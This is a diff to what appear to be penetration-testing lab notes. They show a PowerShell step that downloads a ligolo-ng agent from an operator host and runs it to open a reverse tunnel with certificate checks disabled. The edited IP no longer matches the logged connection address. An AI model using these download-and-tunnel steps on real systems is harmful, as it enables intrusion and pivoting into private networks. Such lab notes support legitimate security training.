@@ -26,7 +26,7 @@ sudo ip link set ligolo up
 ```
 PS C:\Users\dmzadmin\Desktop> iwr -uri http://192.168.45.242:8000/winagent.exe  -Outfile agent.exe
 
-PS C:\Users\dmzadmin\Desktop> .\agent.exe -connect 192.168.45.242:11601 -ignore-cert
+PS C:\Users\dmzadmin\Desktop> .\agent.exe -connect 192.168.45.197:11601 -ignore-cert
 time="2024-02-16T05:06:12-08:00" level=warning msg="warning, certificate validation disabled"
 time="2024-02-16T05:06:12-08:00" level=info msg="Connection established" addr="192.168.45.242:11601"
 ```
